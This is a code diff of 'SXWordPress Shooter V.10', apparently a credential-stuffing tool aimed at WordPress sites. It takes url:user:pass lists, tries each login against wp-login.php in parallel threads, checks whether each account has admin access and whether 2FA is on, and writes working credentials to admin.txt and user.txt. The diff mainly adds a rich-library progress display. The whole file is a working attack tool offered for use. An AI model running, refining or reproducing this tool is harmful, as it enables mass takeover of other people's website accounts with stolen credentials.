@@ -6,18 +6,39 @@ import re
 from datetime import datetime
 from concurrent.futures import ThreadPoolExecutor, as_completed
 
-RED = "\033[91m"
-GREEN = "\033[92m"
-YELLOW = "\033[93m"
-BLUE = "\033[94m"
-RESET = "\033[0m"
+from rich.console import Console, Group
+from rich.live import Live
+from rich.progress import (
+    Progress, BarColumn, TextColumn,
+    MofNCompleteColumn, TimeElapsedColumn,
+    SpinnerColumn, TaskProgressColumn,
+)
+from rich.text import Text
 
-ascii_art = f"""{GREEN}
-██████████████████████████████████████████████████
-█─▄▄▄▄█▄─▀─▄█▄─█▀▀▀█─▄█▄─▄▄─███▄─█─▄█▀░██████─▄▄─█
-█▄▄▄▄─██▀─▀███─█─█─█─███─▄▄▄████▄▀▄███░██░░██─██─█
-▀▄▄▄▄▄▀▄▄█▄▄▀▀▄▄▄▀▄▄▄▀▀▄▄▄▀▀▀▀▀▀▀▄▀▀▀▄▄▄▀▄▄▀▀▄▄▄▄▀
-{YELLOW}SXWordPress Shooter V.10 - sxtools{RESET}
+console = Console(highlight=False)
+
+BANNER = r"""
+. . . ___________________________ 
+                                            __----~~~~~~~~~~~------___
+                                 .  .   ~~//====......          __--~ ~~
+                  -.            \_|//     |||\\  ~~~~~~::::... /~
+               ___-==_       _-~o~  \/    |||  \\            _/~~-
+       __---~~~.==~||\=_    -_--~/_-~|-   |\\   \\        _/~
+   _-~~     .=~    |  \\-_    '-~7  /-   /  ||    \      /
+  ~       .~       |   \\ -_    /  /-   /   ||      \   /
+/  ____  /         |     \\ ~-_/  /|- _/   .||       \ /
+|~~    ~~|--~~~~--_ \     ~==-/   | \~--===~~        .\
+         '         ~-|      /|    |-~\~~       __--~~
+                     |-~~-_/ |    |   ~\_   _-~            /\
+                          /  \     \__   \/~                \__
+                      _--~ _/ | .-~~____--~-/                  ~~==.
+                     ((->/~   '.|||' -_|    ~~-/ ,              . _||
+                               -_     ~\      ~~---l__i__i__i--~~_/
+ [ SXWordPress Shooter ]        _-~-__   ~)  \--______________--~~
+       -sxtools-              //.-~~~-~_--~- |-------~~~~~~~~
+                                     //.-~~~--\
+
+[Malicious Folks - IDN. still l4m3r]________________ . . .
 """
 
 output_lock = threading.Lock()
@@ -25,7 +46,7 @@ output_lock = threading.Lock()
 
 class ShooterArgumentParser(argparse.ArgumentParser):
     def error(self, message):
-        print(f"{RED}[!] {message}{RESET}\n")
+        console.print(f"[red][!] {message}[/red]\n")
         self.print_help()
         self.exit(2)
 
@@ -37,12 +58,7 @@ def parse_payload_line(line):
     match = re.match(r"^(https?://[^:]+):([^:]+):(.+)$", line)
     if not match:
         return None, None, None
-    url = match.group(1).strip()
-    user = match.group(2).strip()
-    password = match.group(3).strip()
-    if not url or not user or not password:
-        return None, None, None
-    return url, user, password
+    return match.group(1).strip(), match.group(2).strip(), match.group(3).strip()
 
 
 def attempt_login(target_url, username, password, wp_path):
@@ -52,10 +68,9 @@ def attempt_login(target_url, username, password, wp_path):
         path = "/" + path
     full_base = f"{base_url}{path}"
     login_url = f"{full_base}/wp-login.php"
-    session = requests.Session()
+    session   = requests.Session()
     data = {
-        "log": username,
-        "pwd": password,
+        "log": username, "pwd": password,
         "wp-submit": "Log In",
         "redirect_to": f"{full_base}/wp-admin/",
         "testcookie": "1",
@@ -63,67 +78,46 @@ def attempt_login(target_url, username, password, wp_path):
     try:
         response = session.post(login_url, data=data, allow_redirects=True, timeout=15)
     except Exception:
-        # jika request sama sekali gagal (timeout, DNS, dll) anggap saja not_vuln
-        # "blocked" hanya dipakai untuk status HTTP tertentu (401/402/403/500)
         return False, "not_vuln", None, False
 
-    cookies = session.cookies.get_dict()
-    login_final_url = response.url or ""
-    has_logged_cookie = "wordpress_logged_in" in "".join(cookies.keys())
-
-    # deteksi indikasi 2FA pada halaman login
+    has_logged_cookie = "wordpress_logged_in" in "".join(session.cookies.keys())
     login_body = (response.text or "").lower()
     twofa_phrases = [
-        "two-factor authentication",
-        "2fa verification code",
-        "two factor authentication",
-        "authentication code:",
-        "use a backup code",
+        "two-factor authentication", "2fa verification code",
+        "two factor authentication", "authentication code:", "use a backup code",
     ]
     is_2fa = any(p in login_body for p in twofa_phrases)
 
-    # jika tidak ada cookie login, cek status code untuk menentukan blocked / not_vuln
     if not has_logged_cookie:
-        if response.status_code in (401, 402, 403, 500):
-            return False, "blocked", login_final_url, is_2fa
-        return False, "not_vuln", login_final_url, is_2fa
+        status = "blocked" if response.status_code in (401, 402, 403, 500) else "not_vuln"
+        return False, status, response.url, is_2fa
 
-    # sudah login, cek akses langsung ke /wp-admin/
-    admin_url = f"{full_base}/wp-admin/"
     try:
-        admin_resp = session.get(admin_url, allow_redirects=True, timeout=15)
-        admin_final_url = (admin_resp.url or "").lower()
+        admin_resp = session.get(f"{full_base}/wp-admin/", allow_redirects=True, timeout=15)
         admin_body = (admin_resp.text or "").lower()
-        is_admin_url = "/wp-admin" in admin_final_url
         forbidden_phrases = [
-            "you are not allowed to access this page.",
+            "you are not allowed to access this page",
             "you do not currently have privileges on this site",
             "you do not have sufficient permissions",
             "the current user doesn't have the",
             "you don't have permission to access this resource",
         ]
         forbidden = any(p in admin_body for p in forbidden_phrases)
-
-        # 2FA juga bisa muncul saat akses /wp-admin/
-        admin_twofa = any(p in admin_body for p in twofa_phrases)
-        is_2fa = is_2fa or admin_twofa
-
-        # jika /wp-admin mengembalikan status kode blokir, anggap bukan admin
-        if admin_resp.status_code in (401, 402, 403, 500):
-            is_admin = False
-        else:
-            is_admin = is_admin_url and not forbidden
+        is_2fa    = is_2fa or any(p in admin_body for p in twofa_phrases)
+        is_admin  = (
+            "/wp-admin" in admin_resp.url.lower()
+            and not forbidden
+            and admin_resp.status_code not in (401, 403)
+        )
     except Exception:
-        admin_final_url = None
         is_admin = True
 
-    status = "admin" if is_admin else "user"
-    return True, status, login_final_url, is_2fa
+    return True, ("admin" if is_admin else "user"), response.url, is_2fa
 
 
 def process_target(line, wp_path):
     url, user, password = parse_payload_line(line)
-    if not url or not user or not password:
+    if not url:
         return None
     success, status, final_url, is_2fa = attempt_login(url, user, password, wp_path)
     return url, user, password, success, status, final_url, is_2fa
@@ -134,112 +128,125 @@ def main():
         description="SXWordPress Shooter V.10 - sxtools",
         formatter_class=argparse.RawTextHelpFormatter,
     )
-    parser.add_argument(
-        "-i",
-        "--input",
-        required=True,
-        help="path ke file payload (format: https://domain.com:user:pass per baris)",
-    )
-    parser.add_argument(
-        "-t",
-        "--threads",
-        type=int,
-        default=10,
-        help="jumlah thread worker (default: 10)",
-    )
-    parser.add_argument(
-        "-path",
-        "--path",
-        dest="wp_path",
-        default="",
-        help="path instalasi WordPress, misal /blog (opsional, default root)",
-    )
+    parser.add_argument("-i", "--input",   required=True, help="path ke file payload (url:user:pass)")
+    parser.add_argument("-t", "--threads", type=int, default=10, help="jumlah thread (default: 10)")
+    parser.add_argument("-path", "--path", default="", help="sub-path WP, misal /blog")
     args = parser.parse_args()
-    if os.name == "nt":
-        os.system("cls")
-    else:
-        os.system("clear")
-    print(ascii_art)
-    payload_file = args.input
-    wp_path = args.wp_path or ""
-    if not os.path.isfile(payload_file):
-        print(f"{RED}[!] File tidak ditemukan: {payload_file}{RESET}")
+
+    os.system("cls" if os.name == "nt" else "clear")
+
+    if not os.path.isfile(args.input):
+        console.print(f"[red][!] File tidak ditemukan: {args.input}[/red]")
         return
-    max_threads = args.threads if args.threads and args.threads > 0 else 10
-    with open(payload_file, "r", encoding="utf-8", errors="ignore") as f:
-        lines = [line for line in f if line.strip()]
+
+    with open(args.input, "r", encoding="utf-8", errors="ignore") as f:
+        lines = [l for l in f if l.strip()]
     if not lines:
-        print(f"{RED}[!] Tidak ada payload di dalam file.{RESET}")
+        console.print("[red][!] File kosong.[/red]")
         return
-    output_dir = os.path.join(os.getcwd(), "output")
-    os.makedirs(output_dir, exist_ok=True)
-    ts_filename = datetime.now().strftime("%Y%m%d-%H%M%S")
-    run_dir_name = f"sxwp-vuln-{ts_filename}"
-    run_dir = os.path.join(output_dir, run_dir_name)
+
+    run_dir = os.path.join(
+        os.getcwd(), "output",
+        f"sxwp-vuln-{datetime.now().strftime('%Y%m%d-%H%M%S')}"
+    )
     os.makedirs(run_dir, exist_ok=True)
-    admin_output_path = os.path.join(run_dir, "admin.txt")
-    user_output_path = os.path.join(run_dir, "user.txt")
-    total_targets = len(lines)
-    print(f"{BLUE}[🔫] Menjalankan WordPress Shoot dengan {total_targets} target menggunakan {max_threads} threads...{RESET}")
 
-    vuln_entries = []
-    block_height = 0
-    processed_count = 0
-    vuln_count = 0
-    not_vuln_count = 0
-    blocked_count = 0
-    admin_count = 0
-    user_count = 0
+    total = len(lines)
+    vuln = not_vuln = blocked = admin_c = user_c = 0
 
-    def render_block(current_url):
-        nonlocal block_height
-        if block_height > 0:
-            # gunakan escape sequence yang lebih umum: cursor up (A) + clear to end (J)
-            print(f"\033[{block_height}A", end="")
-            print("\033[J", end="")
-        print(f"{BLUE}[ SCANNING ] {processed_count}/{total_targets} target selesai | Terakhir: {current_url}{RESET}", flush=True)
-        print(f"{YELLOW}Vuln: {vuln_count} | Not Vuln: {not_vuln_count} | Blocked: {blocked_count} | Admin: {admin_count} | User: {user_count}{RESET}", flush=True)
-        for ts, url_v, user_v, pass_v, role, is_2fa in vuln_entries:
-            label = "ADMIN" if role == "admin" else "USER"
-            color = RED if role == "admin" else YELLOW
-            extra = " [2FA Required]" if is_2fa else ""
-            print(f"{color}[{ts}] [{label}] {url_v} | {user_v}:{pass_v}{extra}{RESET}")
-        block_height = 2 + len(vuln_entries)
+    # ── Banner & Info (dicetak sekali, tidak berubah) ─────────────────────────
+    console.print(f"[green]{BANNER}[/green]")
+    console.print(f"[cyan] [🔫] Target: {total}  |  Threads: {args.threads}[/cyan]\n")
 
-    with ThreadPoolExecutor(max_workers=max_threads) as executor:
-        futures = [executor.submit(process_target, line, wp_path) for line in lines]
-        for future in as_completed(futures):
-            result = future.result()
-            processed_count += 1
-            if not result:
-                render_block("-")
-                continue
-            url, user, password, success, status, final_url, is_2fa = result
-            if status == "blocked":
-                blocked_count += 1
-            elif success:
-                vuln_count += 1
-                # status: "admin" atau "user"
-                if status == "admin":
-                    role = "admin"
-                    admin_count += 1
-                else:
-                    role = "user"
-                    user_count += 1
-                ts = datetime.now().strftime("%H:%M:%S")
-                vuln_entries.append((ts, url, user, password, role, is_2fa))
+    # ── Progress bar ──────────────────────────────────────────────────────────
+    progress = Progress(
+        SpinnerColumn(spinner_name="dots", style="cyan"),
+        TextColumn(" [bold cyan]{task.percentage:>5.1f}%[/bold cyan]"),
+        BarColumn(
+            bar_width=38,
+            style="grey23",
+            complete_style="bright_green",
+            finished_style="green",
+            pulse_style="cyan",
+        ),
+        MofNCompleteColumn(),
+        TimeElapsedColumn(),
+        console=console,
+        transient=True,
+    )
+    task_id = progress.add_task("scanning", total=total)
+
+    def make_panel():
+        """Live panel: stats (1 baris) + progress bar."""
+        stats_text = Text()
+        stats_text.append(f" Vuln: {vuln}", style="bold green")
+        stats_text.append(f"  ✗ {not_vuln}", style="dim")
+        stats_text.append(f"  Blocked: {blocked}", style="yellow")
+        stats_text.append(f"  Admin: {admin_c}", style="bold red")
+        stats_text.append(f"  User: {user_c}", style="bold yellow")
+        return Group(stats_text, progress)
+
+    # ── Main loop ─────────────────────────────────────────────────────────────
+    # rich.Live: setiap live.console.print() akan muncul DI ATAS live panel.
+    # Live panel (stats + progress) selalu ada di paling bawah layar.
+    # Sehingga layout menjadi:
+    #
+    #   [Banner]                ← dicetak sekali sebelum Live
+    #   [Info]                  ← dicetak sekali sebelum Live
+    #   [ADMIN] log...          ← live.console.print → append di atas panel
+    #   [USER]  log...          ← live.console.print → append di atas panel
+    #   ─────────────────────── ← live panel (selalu di bawah)
+    #    Vuln: X  ✗ Y  ...
+    #    5.42% ████████── 13/19
+    #
+    with Live(make_panel(), console=console, refresh_per_second=10,
+              vertical_overflow="visible") as live:
+        with ThreadPoolExecutor(max_workers=args.threads) as executor:
+            futures = [executor.submit(process_target, line, args.path) for line in lines]
+            for future in as_completed(futures):
+                res = future.result()
                 with output_lock:
-                    target_output = admin_output_path if role == "admin" else user_output_path
-                    with open(target_output, "a", encoding="utf-8") as f:
-                        f.write(f"{url}:{user}:{password}\n")
-            else:
-                not_vuln_count += 1
-            render_block(url)
+                    progress.advance(task_id)
 
-    print()
-    print(f"{GREEN}[✓] Selesai.{RESET}")
-    print(f"{GREEN}/output/{run_dir_name}/admin.txt{RESET}")
-    print(f"{GREEN}/output/{run_dir_name}/user.txt{RESET}")
+                    if not res:
+                        live.update(make_panel())
+                        continue
+
+                    url, user, pwd, success, status, _, is_2fa = res
+
+                    if status == "blocked":
+                        blocked += 1
+                    elif success:
+                        vuln += 1
+                        if status == "admin":
+                            admin_c += 1
+                        else:
+                            user_c += 1
+
+                        ts    = datetime.now().strftime("%H:%M:%S")
+                        extra = " [2FA]" if is_2fa else ""
+
+                        # Cetak vuln log — muncul di atas live panel
+                        if status == "admin":
+                            live.console.print(
+                                f"[red][ADMIN][/red] [{ts}] [bold]{url}[/bold] | {user}:{pwd}{extra}"
+                            )
+                        else:
+                            live.console.print(
+                                f"[yellow][USER][/yellow]  [{ts}] {url} | {user}:{pwd}{extra}"
+                            )
+
+                        fname = "admin.txt" if status == "admin" else "user.txt"
+                        with open(os.path.join(run_dir, fname), "a", encoding="utf-8") as fh:
+                            fh.write(f"{url}:{user}:{pwd}\n")
+                    else:
+                        not_vuln += 1
+
+                    # Update live panel (stats + progress) — in-place, tidak scroll
+                    live.update(make_panel())
+
+    # ── Summary ───────────────────────────────────────────────────────────────
+    console.print(f"[green][✓] Selesai! Output: {run_dir}[/green]\n")
 
 
 if __name__ == "__main__":
